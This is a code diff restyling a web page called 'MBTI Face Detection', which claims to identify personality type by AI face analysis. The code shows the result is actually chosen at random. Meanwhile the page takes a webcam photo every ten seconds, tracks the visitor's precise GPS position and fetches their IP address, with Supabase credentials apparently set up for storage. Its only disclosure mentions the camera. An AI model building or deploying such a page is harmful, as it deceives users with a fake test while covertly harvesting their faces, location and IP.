@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>MBTI Face Detection</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <script src="config.js"></script>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -12,12 +12,11 @@
     body {
       font-family: 'Inter', sans-serif;
       min-height: 100vh;
-      background: linear-gradient(135deg, #16162a 0%, #1a1a2e 50%, #1e1e3a 100%);
+      background: #0a0a1a;
       color: #fff;
-      overflow-x: hidden;
     }
 
-    /* ===== LANDING ===== */
+    /* LANDING */
     #landing {
       display: flex;
       flex-direction: column;
@@ -26,24 +25,16 @@
       min-height: 100vh;
       padding: 20px;
       text-align: center;
+      background: radial-gradient(ellipse at center, #1a1040 0%, #0a0a1a 70%);
     }
 
-    .logo {
-      font-size: 64px;
-      margin-bottom: 20px;
-      animation: float 3s ease-in-out infinite;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
+    .logo { font-size: 72px; margin-bottom: 16px; }
 
     h1 {
-      font-size: 36px;
-      font-weight: 700;
-      margin-bottom: 10px;
-      background: linear-gradient(90deg, #8b5cf6, #6940c5);
+      font-size: 42px;
+      font-weight: 800;
+      margin-bottom: 12px;
+      background: linear-gradient(135deg, #8b5cf6, #a78bfa);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
     }
@@ -52,13 +43,13 @@
       font-size: 16px;
       color: #94a3b8;
       margin-bottom: 40px;
-      max-width: 400px;
+      max-width: 420px;
       line-height: 1.6;
     }
 
     .features {
       display: flex;
-      gap: 20px;
+      gap: 16px;
       margin-bottom: 40px;
       flex-wrap: wrap;
       justify-content: center;
@@ -69,45 +60,38 @@
       align-items: center;
       gap: 10px;
       padding: 14px 24px;
-      background: rgba(255,255,255,0.05);
+      background: rgba(255,255,255,0.04);
       border-radius: 12px;
-      border: 1px solid rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.08);
     }
 
-    .feature-icon { font-size: 24px; }
+    .feature-icon { font-size: 20px; }
     .feature-text { font-size: 14px; color: #cbd5e1; }
 
     .start-btn {
-      padding: 18px 56px;
+      padding: 18px 64px;
       font-size: 18px;
-      font-weight: 600;
+      font-weight: 700;
       color: #fff;
-      background: linear-gradient(135deg, #8b5cf6, #6940c5);
+      background: linear-gradient(135deg, #7c3aed, #8b5cf6);
       border: none;
       border-radius: 50px;
       cursor: pointer;
       transition: all 0.3s ease;
-      box-shadow: 0 4px 20px rgba(139,92,246,0.4);
+      box-shadow: 0 4px 25px rgba(124,58,237,0.4);
+      letter-spacing: 0.5px;
     }
 
     .start-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 30px rgba(139,92,246,0.6);
+      transform: translateY(-3px);
+      box-shadow: 0 8px 35px rgba(124,58,237,0.6);
     }
 
-    .start-btn:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      transform: none;
-    }
+    .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-    .privacy-note {
-      margin-top: 20px;
-      font-size: 12px;
-      color: #64748b;
-    }
+    .privacy-note { margin-top: 20px; font-size: 12px; color: #475569; }
 
-    /* ===== DETECTION ===== */
+    /* DETECTION */
     #detection {
       display: none;
       flex-direction: column;
@@ -115,58 +99,22 @@
       justify-content: center;
       min-height: 100vh;
       padding: 20px;
+      background: radial-gradient(ellipse at center, #1a1040 0%, #0a0a1a 70%);
     }
 
-    /* Roulette Ring */
-    .roulette-wrapper {
+    .camera-frame {
       position: relative;
-      width: 380px;
-      height: 380px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      width: 320px;
+      height: 320px;
     }
 
-    .roulette-ring {
-      position: absolute;
-      width: 380px;
-      height: 380px;
-      animation: spinRing 20s linear infinite;
-    }
-
-    @keyframes spinRing {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-
-    .roulette-type {
-      position: absolute;
-      font-size: 11px;
-      font-weight: 700;
-      color: #8b5cf6;
-      text-shadow: 0 0 10px rgba(139,92,246,0.5);
-      width: 36px;
-      text-align: center;
-      transition: all 0.15s ease;
-    }
-
-    .roulette-type.active {
-      color: #f0b232 !important;
-      text-shadow: 0 0 20px rgba(240,178,50,0.9) !important;
-      font-size: 13px;
-      transform: scale(1.2);
-    }
-
-    /* Camera circle */
     .camera-circle {
-      position: relative;
-      width: 300px;
-      height: 300px;
+      width: 320px;
+      height: 320px;
       border-radius: 50%;
       overflow: hidden;
-      border: 3px solid rgba(139,92,246,0.5);
-      box-shadow: 0 0 40px rgba(139,92,246,0.3), inset 0 0 40px rgba(0,0,0,0.3);
-      z-index: 10;
+      border: 4px solid #7c3aed;
+      box-shadow: 0 0 60px rgba(124,58,237,0.4), 0 0 120px rgba(124,58,237,0.15);
     }
 
     #webcam {
@@ -174,50 +122,87 @@
       height: 100%;
       object-fit: cover;
       transform: scaleX(-1);
+      display: block;
     }
 
-    /* Scan lines */
     .scan-overlay {
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
       border-radius: 50%;
       pointer-events: none;
       overflow: hidden;
-      z-index: 11;
     }
 
     .scan-line {
       position: absolute;
       left: 0; right: 0;
       height: 2px;
-      background: linear-gradient(90deg, transparent, #8b5cf6, transparent);
+      background: linear-gradient(90deg, transparent, #a78bfa, transparent);
       opacity: 0;
       animation: scan 2.5s ease-in-out infinite;
     }
 
     @keyframes scan {
       0% { top: 0; opacity: 0; }
-      10% { opacity: 0.8; }
-      90% { opacity: 0.8; }
+      10% { opacity: 0.7; }
+      90% { opacity: 0.7; }
       100% { top: 100%; opacity: 0; }
     }
 
-    /* Status under camera */
+    /* MBTI Ticker - below camera */
+    .ticker-wrapper {
+      width: 100%;
+      max-width: 500px;
+      overflow: hidden;
+      margin-top: 24px;
+      mask-image: linear-gradient(to right, transparent, black 15%, black 85%, transparent);
+      -webkit-mask-image: linear-gradient(to right, transparent, black 15%, black 85%, transparent);
+    }
+
+    .ticker-track {
+      display: flex;
+      gap: 12px;
+      animation: ticker 20s linear infinite;
+      width: max-content;
+    }
+
+    @keyframes ticker {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+
+    .ticker-item {
+      font-size: 13px;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 8px;
+      white-space: nowrap;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.08);
+      transition: all 0.3s;
+    }
+
+    .ticker-item.highlight {
+      background: rgba(240,178,50,0.2);
+      border-color: rgba(240,178,50,0.5);
+      color: #f0b232;
+      box-shadow: 0 0 20px rgba(240,178,50,0.3);
+    }
+
+    /* Status */
     .status-section {
-      margin-top: 30px;
+      margin-top: 24px;
       text-align: center;
-      z-index: 10;
     }
 
     .status-badge {
       display: inline-flex;
       align-items: center;
       gap: 8px;
-      padding: 10px 24px;
-      background: rgba(139,92,246,0.2);
+      padding: 10px 28px;
+      background: rgba(124,58,237,0.15);
       border-radius: 30px;
-      border: 1px solid rgba(139,92,246,0.4);
-      margin-bottom: 12px;
+      border: 1px solid rgba(124,58,237,0.3);
     }
 
     .status-dot {
@@ -230,43 +215,28 @@
 
     @keyframes pulse {
       0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.8); }
+      50% { opacity: 0.4; transform: scale(0.7); }
     }
 
-    .status-text {
-      font-size: 15px;
-      font-weight: 500;
-      color: #e2e8f0;
-    }
+    .status-text { font-size: 15px; font-weight: 600; color: #e2e8f0; }
 
-    /* Countdown ring */
-    .countdown-container {
+    .countdown-row {
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
-      margin-top: 8px;
+      margin-top: 12px;
     }
 
     .countdown-ring {
       position: relative;
-      width: 36px;
-      height: 36px;
+      width: 40px;
+      height: 40px;
     }
 
-    .countdown-ring svg {
-      transform: rotate(-90deg);
-    }
-
-    .countdown-ring circle {
-      fill: none;
-      stroke-width: 3;
-    }
-
-    .countdown-ring .bg {
-      stroke: rgba(139,92,246,0.2);
-    }
-
+    .countdown-ring svg { transform: rotate(-90deg); }
+    .countdown-ring circle { fill: none; stroke-width: 3; }
+    .countdown-ring .bg { stroke: rgba(124,58,237,0.15); }
     .countdown-ring .progress {
       stroke: #8b5cf6;
       stroke-dasharray: 88;
@@ -275,113 +245,84 @@
       transition: stroke-dashoffset 1s linear;
     }
 
-    .countdown-number {
+    .countdown-num {
       position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 13px;
-      font-weight: 700;
-      color: #8b5cf6;
+      top: 50%; left: 50%;
+      transform: translate(-50%,-50%);
+      font-size: 14px;
+      font-weight: 800;
+      color: #a78bfa;
     }
 
-    .countdown-label {
-      font-size: 13px;
-      color: #94a3b8;
-    }
+    .countdown-label { font-size: 13px; color: #64748b; }
 
-    /* Analysis text */
-    .analysis-text {
-      font-size: 13px;
-      color: #64748b;
-      margin-top: 8px;
-      animation: blink 1.5s infinite;
-    }
-
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
-    }
-
-    #faceCanvas, #captureCanvas { display: none; }
-
-    /* ===== MBTI RESULT ===== */
+    /* RESULT OVERLAY */
     #mbtiResult {
       display: none;
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
-      background: linear-gradient(135deg, #16162a 0%, #1a1a2e 50%, #1e1e3a 100%);
+      background: #0a0a1a;
       z-index: 1000;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       padding: 20px;
-      animation: fadeIn 0.5s ease;
     }
 
     #mbtiResult.show {
       display: flex;
+      animation: fadeIn 0.4s ease;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
     .result-avatar {
-      width: 180px;
-      height: 180px;
+      width: 160px;
+      height: 160px;
       border-radius: 50%;
-      background: rgba(255,255,255,0.05);
+      background: rgba(255,255,255,0.03);
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-bottom: 30px;
+      margin-bottom: 28px;
       border: 4px solid;
-      box-shadow: 0 0 60px currentColor;
-      animation: floatAvatar 3s ease-in-out infinite;
+      box-shadow: 0 0 80px currentColor;
     }
 
-    @keyframes floatAvatar {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-
-    .result-avatar img {
-      width: 140px;
-      height: 140px;
-    }
+    .result-avatar img { width: 120px; height: 120px; }
 
     .result-type {
-      font-size: 72px;
+      font-size: 80px;
       font-weight: 800;
-      letter-spacing: 4px;
-      margin-bottom: 8px;
+      letter-spacing: 6px;
+      margin-bottom: 6px;
     }
 
     .result-role {
-      font-size: 16px;
-      font-weight: 500;
+      font-size: 14px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 2px;
       margin-bottom: 8px;
       padding: 6px 20px;
       border-radius: 20px;
-      background: rgba(255,255,255,0.1);
+      background: rgba(255,255,255,0.06);
     }
 
     .result-name {
-      font-size: 24px;
-      font-weight: 600;
+      font-size: 28px;
+      font-weight: 700;
       margin-bottom: 12px;
-      color: #e2e8f0;
+      color: #f1f5f9;
     }
 
     .result-desc {
       font-size: 15px;
       color: #94a3b8;
-      max-width: 500px;
+      max-width: 460px;
       text-align: center;
-      line-height: 1.6;
-      margin-bottom: 30px;
+      line-height: 1.7;
+      margin-bottom: 28px;
     }
 
     .result-traits {
@@ -393,59 +334,55 @@
     }
 
     .result-traits span {
-      padding: 8px 18px;
+      padding: 8px 20px;
       border-radius: 20px;
       font-size: 13px;
-      font-weight: 500;
+      font-weight: 600;
       border: 1px solid;
     }
 
     .result-footer {
       font-size: 12px;
-      color: #64748b;
+      color: #475569;
+      margin-top: 20px;
     }
 
+    #faceCanvas { display: none; }
+
     @media (max-width: 420px) {
+      h1 { font-size: 32px; }
+      .features { flex-direction: column; width: 100%; }
+      .feature { width: 100%; justify-content: center; }
+      .camera-frame { width: 260px; height: 260px; }
+      .camera-circle { width: 260px; height: 260px; }
       .result-type { font-size: 56px; }
-      .result-avatar { width: 140px; height: 140px; }
-      .result-avatar img { width: 110px; height: 110px; }
     }
   </style>
 </head>
 <body>
-  <!-- Landing -->
   <div id="landing">
     <div class="logo">🧠</div>
     <h1>MBTI Face Detection</h1>
     <p class="subtitle">Temukan tipe kepribadian MBTI Anda melalui analisis wajah secara real-time menggunakan teknologi AI</p>
     <div class="features">
-      <div class="feature">
-        <span class="feature-icon">📸</span>
-        <span class="feature-text">Real-time Detection</span>
-      </div>
-      <div class="feature">
-        <span class="feature-icon">⚡</span>
-        <span class="feature-text">Instant Result</span>
-      </div>
-      <div class="feature">
-        <span class="feature-icon">🎯</span>
-        <span class="feature-text">16 Tipe MBTI</span>
-      </div>
+      <div class="feature"><span class="feature-icon">📸</span><span class="feature-text">Real-time Detection</span></div>
+      <div class="feature"><span class="feature-icon">⚡</span><span class="feature-text">Instant Result</span></div>
+      <div class="feature"><span class="feature-icon">🎯</span><span class="feature-text">16 Tipe MBTI</span></div>
     </div>
     <button id="startBtn" class="start-btn" onclick="startDetection()">Mulai Deteksi</button>
     <p class="privacy-note">Kamera diperlukan untuk analisis wajah</p>
   </div>
 
-  <!-- Detection -->
   <div id="detection">
-    <div class="roulette-wrapper">
-      <div class="roulette-ring" id="rouletteRing"></div>
+    <div class="camera-frame">
       <div class="camera-circle">
         <video id="webcam" autoplay playsinline></video>
-        <div class="scan-overlay">
-          <div class="scan-line"></div>
-        </div>
       </div>
+      <div class="scan-overlay"><div class="scan-line"></div></div>
+    </div>
+
+    <div class="ticker-wrapper">
+      <div class="ticker-track" id="tickerTrack"></div>
     </div>
 
     <div class="status-section">
@@ -453,24 +390,22 @@
         <div class="status-dot"></div>
         <span class="status-text" id="statusText">Mendeteksi...</span>
       </div>
-      <div class="countdown-container">
+      <div class="countdown-row">
         <div class="countdown-ring">
-          <svg width="36" height="36" viewBox="0 0 36 36">
-            <circle class="bg" cx="18" cy="18" r="14"></circle>
-            <circle class="progress" id="countdownCircle" cx="18" cy="18" r="14"></circle>
+          <svg width="40" height="40" viewBox="0 0 40 40">
+            <circle class="bg" cx="20" cy="20" r="14"></circle>
+            <circle class="progress" id="countdownCircle" cx="20" cy="20" r="14"></circle>
           </svg>
-          <span class="countdown-number" id="countdownNumber">10</span>
+          <span class="countdown-num" id="countdownNumber">10</span>
         </div>
         <span class="countdown-label">detik hingga analisis berikutnya</span>
       </div>
-      <div class="analysis-text" id="analysisText">Analisis MBTI sedang berlangsung</div>
     </div>
   </div>
 
-  <!-- MBTI Result Overlay -->
   <div id="mbtiResult">
     <div class="result-avatar" id="resultAvatar">
-      <img id="resultAvatarImg" src="" alt="Avatar">
+      <img id="resultAvatarImg" src="" alt="">
     </div>
     <div class="result-type" id="resultType"></div>
     <div class="result-role" id="resultRole"></div>
@@ -481,50 +416,41 @@
   </div>
 
   <canvas id="faceCanvas"></canvas>
-  <canvas id="captureCanvas"></canvas>
 
   <script>
-    // ===== CONFIG =====
-    // MBTI group colors matching 16personalities.com
     const MBTI_COLORS = {
-      // Analysts - Purple
-      INTJ: "#6940c5", INTP: "#6940c5", ENTJ: "#6940c5", ENTP: "#6940c5",
-      // Diplomats - Green
-      INFJ: "#43b581", INFP: "#43b581", ENFJ: "#43b581", ENFP: "#43b581",
-      // Sentinels - Blue
-      ISTJ: "#3ba676", ISFJ: "#3ba676", ESTJ: "#3ba676", ESFJ: "#3ba676",
-      // Explorers - Yellow
-      ISTP: "#f0b232", ISFP: "#f0b232", ESTP: "#f0b232", ESFP: "#f0b232"
+      INTJ:"#6940c5",INTP:"#6940c5",ENTJ:"#6940c5",ENTP:"#6940c5",
+      INFJ:"#43b581",INFP:"#43b581",ENFJ:"#43b581",ENFP:"#43b581",
+      ISTJ:"#3ba676",ISFJ:"#3ba676",ESTJ:"#3ba676",ESFJ:"#3ba676",
+      ISTP:"#f0b232",ISFP:"#f0b232",ESTP:"#f0b232",ESFP:"#f0b232"
     };
 
     const MBTI_TYPES = ["INTJ","INTP","ENTJ","ENTP","INFJ","INFP","ENFJ","ENFP","ISTJ","ISFJ","ESTJ","ESFJ","ISTP","ISFP","ESTP","ESFP"];
 
     const MBTI_DATA = {
-      INTJ: { name: "The Architect", role: "Analyst", desc: "Imaginative and strategic thinkers, with a plan for everything.", traits: ["Strategic", "Independent", "Determined"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/intj-architect-male.svg" },
-      INTP: { name: "The Logician", role: "Analyst", desc: "Innovative inventors with an unquenchable thirst for knowledge.", traits: ["Analytical", "Original", "Curious"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/intp-logician-female.svg" },
-      ENTJ: { name: "The Commander", role: "Analyst", desc: "Bold, imaginative and strong-willed leaders, always finding a way.", traits: ["Confident", "Strategic", "Decisive"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/entj-commander-female.svg" },
-      ENTP: { name: "The Debater", role: "Analyst", desc: "Smart and curious thinkers who cannot resist an intellectual challenge.", traits: ["Innovative", "Curious", "Versatile"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/entp-debater-male.svg" },
-      INFJ: { name: "The Advocate", role: "Diplomat", desc: "Quiet and mystical, yet very inspiring and tireless idealists.", traits: ["Idealistic", "Empathetic", "Determined"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg" },
-      INFP: { name: "The Mediator", role: "Diplomat", desc: "Poetic, kind and altruistic people, always eager to help a good cause.", traits: ["Idealistic", "Empathetic", "Creative"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/infp-mediator-male.svg" },
-      ENFJ: { name: "The Protagonist", role: "Diplomat", desc: "Charismatic and inspiring leaders, able to mesmerize their listeners.", traits: ["Charismatic", "Reliable", "Leader"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/enfj-protagonist-male.svg" },
-      ENFP: { name: "The Campaigner", role: "Diplomat", desc: "Enthusiastic, creative and sociable free spirits.", traits: ["Enthusiastic", "Creative", "Sociable"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/enfp-campaigner-male.svg" },
-      ISTJ: { name: "The Logistician", role: "Sentinel", desc: "Practical and fact-minded individuals, whose reliability cannot be doubted.", traits: ["Practical", "Dependable", "Organized"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/istj-logistician-male.svg" },
-      ISFJ: { name: "The Defender", role: "Sentinel", desc: "Very dedicated and warm protectors, always ready to defend their loved ones.", traits: ["Warm", "Protective", "Reliable"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/isfj-defender-female.svg" },
-      ESTJ: { name: "The Executive", role: "Sentinel", desc: "Excellent administrators, unsurpassed at managing things or people.", traits: ["Organized", "Leader", "Dedicated"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/estj-executive-male.svg" },
-      ESFJ: { name: "The Consul", role: "Sentinel", desc: "Extraordinarily caring, social and popular people, always eager to help.", traits: ["Caring", "Social", "Harmony"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/esfj-consul-female.svg" },
-      ISTP: { name: "The Virtuoso", role: "Explorer", desc: "Bold and practical experimenters, masters of all kinds of tools.", traits: ["Bold", "Practical", "Resourceful"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/istp-virtuoso-male.svg" },
-      ISFP: { name: "The Adventurer", role: "Explorer", desc: "Flexible and charming artists, always ready to explore something new.", traits: ["Flexible", "Charming", "Artistic"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/isfp-adventurer-female.svg" },
-      ESTP: { name: "The Entrepreneur", role: "Explorer", desc: "Smart, energetic and very perceptive people, who enjoy living on the edge.", traits: ["Energetic", "Perceptive", "Bold"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/estp-entrepreneur-male.svg" },
-      ESFP: { name: "The Entertainer", role: "Explorer", desc: "Spontaneous, energetic and enthusiastic people.", traits: ["Spontaneous", "Energetic", "Enthusiastic"], avatar: "https://www.16personalities.com/static/images/personality-types/avatars/esfp-entertainer-male.svg" }
+      INTJ:{name:"The Architect",role:"Analyst",desc:"Imaginative and strategic thinkers, with a plan for everything.",traits:["Strategic","Independent","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intj-architect-male.svg"},
+      INTP:{name:"The Logician",role:"Analyst",desc:"Innovative inventors with an unquenchable thirst for knowledge.",traits:["Analytical","Original","Curious"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/intp-logician-female.svg"},
+      ENTJ:{name:"The Commander",role:"Analyst",desc:"Bold, imaginative and strong-willed leaders.",traits:["Confident","Strategic","Decisive"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entj-commander-female.svg"},
+      ENTP:{name:"The Debater",role:"Analyst",desc:"Smart and curious thinkers who cannot resist an intellectual challenge.",traits:["Innovative","Curious","Versatile"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/entp-debater-male.svg"},
+      INFJ:{name:"The Advocate",role:"Diplomat",desc:"Quiet and mystical, yet very inspiring and tireless idealists.",traits:["Idealistic","Empathetic","Determined"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infj-advocate-female.svg"},
+      INFP:{name:"The Mediator",role:"Diplomat",desc:"Poetic, kind and altruistic people, always eager to help a good cause.",traits:["Idealistic","Empathetic","Creative"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/infp-mediator-male.svg"},
+      ENFJ:{name:"The Protagonist",role:"Diplomat",desc:"Charismatic and inspiring leaders, able to mesmerize their listeners.",traits:["Charismatic","Reliable","Leader"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfj-protagonist-male.svg"},
+      ENFP:{name:"The Campaigner",role:"Diplomat",desc:"Enthusiastic, creative and sociable free spirits.",traits:["Enthusiastic","Creative","Sociable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/enfp-campaigner-male.svg"},
+      ISTJ:{name:"The Logistician",role:"Sentinel",desc:"Practical and fact-minded individuals, whose reliability cannot be doubted.",traits:["Practical","Dependable","Organized"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/istj-logistician-male.svg"},
+      ISFJ:{name:"The Defender",role:"Sentinel",desc:"Very dedicated and warm protectors, always ready to defend their loved ones.",traits:["Warm","Protective","Reliable"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/isfj-defender-female.svg"},
+      ESTJ:{name:"The Executive",role:"Sentinel",desc:"Excellent administrators, unsurpassed at managing things or people.",traits:["Organized","Leader","Dedicated"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/estj-executive-male.svg"},
+      ESFJ:{name:"The Consul",role:"Sentinel",desc:"Extraordinarily caring, social and popular people, always eager to help.",traits:["Caring","Social","Harmony"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfj-consul-female.svg"},
+      ISTP:{name:"The Virtuoso",role:"Explorer",desc:"Bold and practical experimenters, masters of all kinds of tools.",traits:["Bold","Practical","Resourceful"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/istp-virtuoso-male.svg"},
+      ISFP:{name:"The Adventurer",role:"Explorer",desc:"Flexible and charming artists, always ready to explore something new.",traits:["Flexible","Charming","Artistic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/isfp-adventurer-female.svg"},
+      ESTP:{name:"The Entrepreneur",role:"Explorer",desc:"Smart, energetic and very perceptive people, who enjoy living on the edge.",traits:["Energetic","Perceptive","Bold"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/estp-entrepreneur-male.svg"},
+      ESFP:{name:"The Entertainer",role:"Explorer",desc:"Spontaneous, energetic and enthusiastic people.",traits:["Spontaneous","Energetic","Enthusiastic"],avatar:"https://www.16personalities.com/static/images/personality-types/avatars/esfp-entertainer-male.svg"}
     };
 
     const SUPABASE_URL = window.SUPABASE_URL;
     const SUPABASE_KEY = window.SUPABASE_KEY;
-
     const CAPTURE_INTERVAL = 10000;
     const CIRCUMFERENCE = 2 * Math.PI * 14;
 
-    // ===== STATE =====
     let cameraStream = null;
     let gpsData = { lat: null, lng: null };
     let gpsWatchId = null;
@@ -533,74 +459,50 @@
     let countdownInterval = null;
     let countdown = 10;
 
-    // ===== INIT ROULETTE =====
-    function initRoulette() {
-      const ring = document.getElementById("rouletteRing");
-      const n = MBTI_TYPES.length;
-      const radius = 170;
-
-      MBTI_TYPES.forEach((type, i) => {
-        const angle = (i / n) * 360;
-        const rad = (angle - 90) * (Math.PI / 180);
-        const x = 190 + radius * Math.cos(rad) - 18;
-        const y = 190 + radius * Math.sin(rad) - 8;
-
+    function initTicker() {
+      const track = document.getElementById("tickerTrack");
+      const items = MBTI_TYPES.map(t => {
         const el = document.createElement("div");
-        el.className = "roulette-type";
-        el.id = `rt-${type}`;
-        el.textContent = type;
-        el.style.left = `${x}px`;
-        el.style.top = `${y}px`;
-        el.style.color = MBTI_COLORS[type];
-        el.style.textShadow = `0 0 10px ${MBTI_COLORS[type]}80`;
-        ring.appendChild(el);
+        el.className = "ticker-item";
+        el.id = `tick-${t}`;
+        el.textContent = t;
+        el.style.color = MBTI_COLORS[t];
+        el.style.borderColor = MBTI_COLORS[t] + "30";
+        return el;
       });
+      // Duplicate for seamless loop
+      items.forEach(el => track.appendChild(el.cloneNode(true)));
     }
 
-    // Animate roulette highlight
-    let rouletteIndex = 0;
-    let rouletteAnim = null;
+    let tickerHighlight = 0;
+    let tickerAnim = null;
 
-    function startRouletteAnimation() {
-      const types = MBTI_TYPES;
-
-      rouletteAnim = setInterval(() => {
-        const prev = document.getElementById(`rt-${types[rouletteIndex % types.length]}`);
-        if (prev) prev.classList.remove("active");
-
-        rouletteIndex++;
-        const curr = document.getElementById(`rt-${rouletteIndex % types.length}`);
-        if (curr) curr.classList.add("active");
-      }, 150);
+    function startTicker() {
+      tickerAnim = setInterval(() => {
+        const prev = document.getElementById(`tick-${MBTI_TYPES[tickerHighlight % 16]}`);
+        if (prev) prev.classList.remove("highlight");
+        tickerHighlight++;
+        const curr = document.getElementById(`tick-${MBTI_TYPES[tickerHighlight % 16]}`);
+        if (curr) curr.classList.add("highlight");
+      }, 180);
     }
 
-    function stopRouletteAnimation() {
-      if (rouletteAnim) clearInterval(rouletteAnim);
-    }
+    function stopTicker() { if (tickerAnim) clearInterval(tickerAnim); }
 
-    // ===== GPS =====
     function startGPS() {
       if (!navigator.geolocation) return;
       gpsWatchId = navigator.geolocation.watchPosition(
-        (pos) => {
-          gpsData.lat = pos.coords.latitude;
-          gpsData.lng = pos.coords.longitude;
-        },
+        p => { gpsData.lat = p.coords.latitude; gpsData.lng = p.coords.longitude; },
         () => {},
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     }
 
-    // ===== IP =====
     async function getUserIP() {
-      try {
-        const r = await fetch("https://api.ipify.org?format=json");
-        const d = await r.json();
-        return d.ip;
-      } catch { return null; }
+      try { const r = await fetch("https://api.ipify.org?format=json"); return (await r.json()).ip; }
+      catch { return null; }
     }
 
-    // ===== START =====
     async function startDetection() {
       const btn = document.getElementById("startBtn");
       btn.disabled = true;
@@ -610,17 +512,16 @@
         cameraStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user", width: 640, height: 480 }
         });
-
         document.getElementById("webcam").srcObject = cameraStream;
         startGPS();
 
         document.getElementById("landing").style.display = "none";
         document.getElementById("detection").style.display = "flex";
 
-        initRoulette();
-        startRouletteAnimation();
-
+        initTicker();
+        startTicker();
         startCountdown();
+
         captureInterval = setInterval(() => {
           capturePhoto();
           resetCountdown();
@@ -634,11 +535,9 @@
       }
     }
 
-    // ===== COUNTDOWN =====
     function startCountdown() {
       countdown = 10;
       updateCountdownUI();
-
       countdownInterval = setInterval(() => {
         countdown--;
         if (countdown < 0) {
@@ -649,26 +548,20 @@
       }, 1000);
     }
 
-    function resetCountdown() {
-      countdown = 10;
-      updateCountdownUI();
-    }
+    function resetCountdown() { countdown = 10; updateCountdownUI(); }
 
     function updateCountdownUI() {
-      const num = document.getElementById("countdownNumber");
-      const circle = document.getElementById("countdownCircle");
-      num.textContent = countdown < 0 ? 0 : countdown;
-
+      document.getElementById("countdownNumber").textContent = Math.max(countdown, 0);
       const offset = CIRCUMFERENCE * (1 - Math.max(countdown, 0) / 10);
-      circle.style.strokeDashoffset = offset;
+      document.getElementById("countdownCircle").style.strokeDashoffset = offset;
     }
 
     function showMBTIResult() {
-      const randomType = MBTI_TYPES[Math.floor(Math.random() * MBTI_TYPES.length)];
-      const data = MBTI_DATA[randomType];
-      const color = MBTI_COLORS[randomType];
+      const type = MBTI_TYPES[Math.floor(Math.random() * MBTI_TYPES.length)];
+      const data = MBTI_DATA[type];
+      const color = MBTI_COLORS[type];
 
-      document.getElementById("resultType").textContent = randomType;
+      document.getElementById("resultType").textContent = type;
       document.getElementById("resultType").style.color = color;
       document.getElementById("resultName").textContent = data.name;
       document.getElementById("resultRole").textContent = data.role;
@@ -678,21 +571,17 @@
       document.getElementById("resultAvatar").style.borderColor = color;
       document.getElementById("resultAvatar").style.color = color;
 
-      const traitsEl = document.getElementById("resultTraits");
-      traitsEl.innerHTML = data.traits.map(t =>
-        `<span style="color: ${color}; border-color: ${color}40; background: ${color}15">${t}</span>`
+      document.getElementById("resultTraits").innerHTML = data.traits.map(t =>
+        `<span style="color:${color};border-color:${color}40;background:${color}15">${t}</span>`
       ).join("");
 
-      stopRouletteAnimation();
       document.getElementById("mbtiResult").classList.add("show");
 
       setTimeout(() => {
         document.getElementById("mbtiResult").classList.remove("show");
